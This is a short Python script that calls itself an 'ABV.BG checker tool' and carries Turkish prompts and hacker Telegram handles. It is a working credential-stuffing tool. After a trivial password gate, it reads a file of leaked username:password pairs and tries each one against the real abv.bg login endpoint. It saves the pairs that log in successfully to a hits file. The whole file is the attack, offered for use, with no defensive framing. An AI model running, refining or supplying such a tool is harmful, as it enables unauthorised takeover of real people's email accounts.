import requests
import time,os
import requests
logo='''\x1b[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;36m
  
@@@@@@   @@@@@@@   @@@  @@@
@@@@@@@@  @@@@@@@@  @@@  @@@
@@!  @@@  @@!  @@@  @@!  @@@
!@!  @!@  !@   @!@  !@!  @!@
@!@!@!@!  @!@!@!@   @!@  !@!
!!!@!!!!  !!!@!!!!  !@!  !!!
!!:  !!!  !!:  !!!  :!:  !!:
:!:  !:!  :!:  !:!   ::!!:!
::   :::   :: ::::    ::::
 :   : :  :: : ::      :
                 < ABV.BG CHECKER TOOL >
              TELE : @PHPMEHMET / @THOMASHACK

\x1b[1;31m ▬▬▬▬▬▬▬▬▬\x1b[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''
print(logo)
sifre = 'free'
pss = input('\x1b[1;32m 𝐒𝐢𝐟𝐫𝐞 : ')
if pss == sifre:
    print('\x1b[1;32m                    DOĞRU ŞİFRE✅ ')
    time.sleep(2)
    os.system('clear')
else:
    exit('\x1b[1;31m                    HATALI ŞİFRE❌ ')
def check_login(username, password):
    response = requests.post("https://passport.abv.bg/app/profiles/login", data={"service": "mobile20", "username": username, "password": password, "submit_button": "вход"})
    
    # Check if the response contains the word "Refresh" indicating a successful login
    if "Refresh" in response.text:
        return True
    else:
        return False


def main():
    print(logo)
    combo_file_path = input("\x1b[1;39m𝐂𝐨𝐦𝐛𝐨  𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
    good_logins_file = "VpnHit.txt"
    
    with open(combo_file_path, 'r', encoding='utf-8') as file:
        with open(good_logins_file, 'a', encoding='utf-8') as good_logins:
            for line in file:
                try:
                    username, password = line.strip().split(":")
                    if check_login(username, password):
                        good_logins.write(f"{username}:{password}\n")
                        print(f"{username}:{password} | Giriş Başarılı ✅")
                    else:
                        print(f"{username}:{password} | Hatalı Giriş ❌")
                except Exception as e:
                    print(f"Hatalı Combo : {line.strip()} | Hata: {e}")

if __name__ == "__main__":
    main()
